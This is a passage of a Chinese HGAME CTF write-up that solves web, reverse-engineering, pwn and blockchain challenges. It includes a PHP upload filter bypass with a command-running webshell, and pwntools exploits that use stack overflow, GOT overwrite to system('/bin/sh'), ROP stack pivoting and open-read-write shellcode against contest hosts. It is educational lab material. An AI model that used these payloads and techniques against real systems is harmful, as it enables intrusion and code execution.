s.get(url+<span class="string">&#x27;/api/getQuestion&#x27;</span>)</span><br><span class="line">    intro = json.loads(r.text)[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">    <span class="comment">#print(intro)</span></span><br><span class="line">    r = s.post(url+<span class="string">&#x27;/api/verifyAnswer&#x27;</span>, data=&#123;<span class="string">&#x27;id&#x27;</span>:dic[intro]&#125;)</span><br><span class="line">    r = s.get(url+<span class="string">&#x27;/api/getScore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>运行得到100次循环后的结果：<code>&#123;&quot;message&quot;:&quot;hgame&#123;Guess_who_i_am^Happy_Crawler&#125;&quot;&#125;</code>。</p><p>​    </p><h3 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h3><blockquote><p>登陆了之前获取的会员账号之后，兔兔想找一张自己的可爱照片，上传到个人信息的头像中 :D</p><p>不过好像可以上传些奇怪后缀名的文件诶 XD</p></blockquote><p>图片文件上传，抓包尝试，文件名存在关键字黑名单，包括 <code>php/phtml/ini/htaccess</code> 等；</p><p>测试发现可以大小写绕过，将文件名后缀修改为 <code>Php</code>，内容修改为 <code>&lt;?=`cat /flag`;</code>，上传 <code>1.Php</code>，访问即可得到flag：<code>hgame&#123;Unsave_F1L5_SYS7em_UPL0ad!&#125;</code>。</p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="test-your-IDA"><a href="#test-your-IDA" class="headerlink" title="test your IDA"></a>test your IDA</h3><blockquote><p>签到</p></blockquote><p>IDA打开查看字符串有flag：<code>hgame&#123;te5t_y0ur_IDA&#125;</code>。</p><p>​    </p><h3 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h3><blockquote><p>非常简单的汇编</p></blockquote><p>关键操作在 <code>xor eax, 33h</code>，将结果异或0x33即可还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x5b</span>,<span class="number">0x54</span>,<span class="number">0x52</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x56</span>,<span class="number">0x5f</span>,<span class="number">0x50</span>,<span class="number">0x3</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x47</span>,<span class="number">0x3</span>,<span class="number">0x6c</span>,<span class="number">0x41</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x44</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x2</span>,<span class="number">0x57</span>,<span class="number">0x12</span>,<span class="number">0x4e</span>]</span><br><span class="line">flag = [k^<span class="number">0x33</span> <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;welc0me_t0_re_wor1d!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easyenc"><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h3><blockquote><p>easyenc</p></blockquote><p>代码逻辑为逐字符先异或0x32后减86，逆向还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">4</span>, <span class="number">255</span>, <span class="number">253</span>,   <span class="number">9</span>,   <span class="number">1</span>, <span class="number">243</span>, <span class="number">176</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>, </span><br><span class="line">  <span class="number">240</span>, <span class="number">173</span>,   <span class="number">7</span>,   <span class="number">6</span>,  <span class="number">23</span>,   <span class="number">5</span>, <span class="number">235</span>,  <span class="number">23</span>, <span class="number">253</span>,  <span class="number">23</span>, </span><br><span class="line">  <span class="number">234</span>,   <span class="number">1</span>, <span class="number">238</span>,   <span class="number">1</span>, <span class="number">234</span>, <span class="number">177</span>,   <span class="number">5</span>, <span class="number">250</span>,   <span class="number">8</span>,   <span class="number">1</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">172</span>, <span class="number">236</span>,   <span class="number">1</span>, <span class="number">234</span>, <span class="number">253</span>, <span class="number">240</span>,   <span class="number">5</span>,   <span class="number">7</span>,   <span class="number">6</span>, </span><br><span class="line">  <span class="number">249</span>]</span><br><span class="line"></span><br><span class="line">flag = [((k+<span class="number">86</span>)^<span class="number">0x32</span>) &amp; <span class="number">0xff</span> <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="a-cup-of-tea"><a href="#a-cup-of-tea" class="headerlink" title="a_cup_of_tea"></a>a_cup_of_tea</h3><blockquote><p>兔兔的家人都爱喝茶，所以兔兔带了些茶叶回去</p></blockquote><p>魔改了delta为 <code>0xABCDEF23</code> 的Tea算法，用解密算法还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xABCDEF23</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0xABCDEF23</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = [<span class="number">0x2E63829D</span>, <span class="number">0xC14E400F</span>, <span class="number">0x9B39BFB9</span>, <span class="number">0x5A1F8B14</span>, <span class="number">0x61886DDE</span>, <span class="number">0x6565C6CF</span>, <span class="number">0x9F064F64</span>, <span class="number">0x236A43F6</span>, <span class="number">0x7D6B</span>]</span><br><span class="line">    cc = [long_to_bytes(k)[::-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line">    key = [<span class="number">0x12345678</span>, <span class="number">0x23456789</span>, <span class="number">0x34567890</span>, <span class="number">0x45678901</span>]</span><br><span class="line">    flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">        d = decrypt(c[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">        flag += long_to_bytes(d[<span class="number">0</span>])[::-<span class="number">1</span>]+long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    flag += long_to_bytes(c[-<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><blockquote><p>兔兔把自己行李箱的密码用一种编码写在了纸条上，但他忘了怎么解密，你能帮帮他吗？</p></blockquote><p>代码逻辑为将低4位和高4位分别取出存入 <code>v4[2*i]</code> 和 <code>v4[2*i+1]</code>，提取比对字符串 <code>dword_403000</code>，逆向还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>((c[<span class="number">2</span>*i+<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + c[<span class="number">2</span>*i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>pwn签到，直接 <code>cat flag</code> 得flag。</p><p>​    </p><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>简单栈溢出到 <code>b4ckd0or()</code> 函数上，特别的一点是用 <code>close(1)</code> 关闭了标准输出，可以用 <code>execv 1&gt;&amp;0</code> 将标准输出重定向到标准输入，因为默认打开一个终端后，0/1/2都指向同一个位置也就是当前终端，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31066</span>)</span><br><span class="line"></span><br><span class="line">b4ckd0or=<span class="number">0x401176</span></span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(b4ckd0or)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><blockquote><p>兔兔在买高铁票时想要选一个好座位。</p><p>HINTS:</p><p>数组下标的检查好像少了点东西</p></blockquote><p>由代码逻辑知可以写入bss段，只限制了上限未限制下限，使用负数可打GOT表内容。覆盖 <code>exit()</code> 的GOT表为 <code>main()</code> 使程序循环，再覆盖 <code>puts()</code> 的GOT表泄露 <code>puts()</code> 地址计算得到libc基地址，最后覆盖 <code>puts()</code> 的GOT表为 <code>system(&quot;/bin/sh\x00&quot;)</code>。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">30831</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=elf.sym.main</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-6&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(p64(main))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-9&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base=puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-9&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(base+libc.sym.system))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><blockquote><p>HINTS:</p><p>标题就是考点捏，没思路的可以按照标题查一查</p><p>觉得溢出的不够多？那就先找个地方把ROP链写进去，再把栈迁移过去执行吧</p></blockquote><p>标题表明需orw，但开启了沙盒禁用了 <code>execve()/execveat()</code>，<code>read()</code> 读的字节数足以用ROP链泄露libc，但溢出字节0x28不足以执行orw，需先做栈迁移后，再执行orw。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">30153</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x401393</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">main=elf.sym.main</span><br><span class="line">puts_plt=elf.plt.puts</span><br><span class="line">puts_got=elf.got.puts</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)+p64(elf.sym.main)</span><br><span class="line">r.send(pl)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">base=leak-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">libc.address=base</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findGadget</span>(<span class="params">gadget</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">next</span>(libc.search(asm(gadget),executable=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">bss_rop=<span class="number">0x404048</span></span><br><span class="line">bss_flag=<span class="number">0x404038</span></span><br><span class="line">leave_ret=<span class="number">0x4012EE</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(libc.sym.read)+p64(leave_ret)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_flag)+p64(libc.sym.read)</span><br><span class="line">pl+=p64(pop_rdi)+p64(bss_flag)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(<span class="number">0</span>)+p64(libc.sym.<span class="built_in">open</span>) <span class="comment"># fd=open(&#x27;./flag&#x27;,0)  #3</span></span><br><span class="line">pl+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rdx;ret&#x27;</span>))+p64(<span class="number">0x30</span>)+p64(libc.sym.read) <span class="comment"># read(3,buf,0x100)</span></span><br><span class="line">pl+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rdx;ret&#x27;</span>))+p64(<span class="number">0x30</span>)+p64(libc.sym.write) <span class="comment"># puts(buf)</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><blockquote><p>HINTS:</p><p>一次read不够多，为什么不再读一次呢？</p></blockquote><p>初看代码像ret2shellcode，但开启了沙盒禁用了 <code>execve()/execveat()</code>，而且 <code>read()</code> 只能读入0x10字节。</p><p>需要写入shellcode，但需先调用一次 <code>read()</code> 以读取更多的字节，再执行orw即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31331</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov rdx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">pl = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">pl += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">pl += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">pl = asm(pl)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>))))</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf</span>+pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><h3 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h3><blockquote><p>题目中给出了三个端口，分别是 RPC、水龙头、题目交互端。 由于靶机端口随机，需要选手自行尝试。</p><p>其中，浏览器可直接访问的是水龙头，浏览器直接访问报 403 的是 RPC，浏览器无法访问的是题目交互端，需使用 nc 连接。</p></blockquote><p>nc连接，选1生成账号，在水龙头里转账后，选2生成合约地址，选4查看源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// contracts/checkin.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">contract Checkin &#123;</span><br><span class="line">    string greeting;</span><br><span class="line"></span><br><span class="line">    constructor(string memory _greeting)  &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (string memory) &#123;</span><br><span class="line">        return greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(string memory _greeting) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        string memory expected = &quot;HelloHGAME!&quot;;</span><br><span class="line">        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑为通过 <code>setGreeting()</code> 传入字符串使得 <code>isSolved()</code> 返回 <code>true</code>，传入的字符串为 <code>HelloHGAME!</code> 即满足条件。</p><p>尝试在Remix中攻击已生成的合约地址没打通，问出题人知对Remix环境做了限制（防作弊），需采用web3py脚本方式进行攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># RPC网络环境</span></span><br><span class="line">rpc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">w3 = Web3(HTTPProvider(rpc))</span><br><span class="line"><span class="comment"># 检测连通性</span></span><br><span class="line"><span class="built_in">print</span>(w3.isConnected())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Metamask地址</span></span><br><span class="line">myAccount = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 合约地址</span></span><br><span class="line">contractAddress = <span 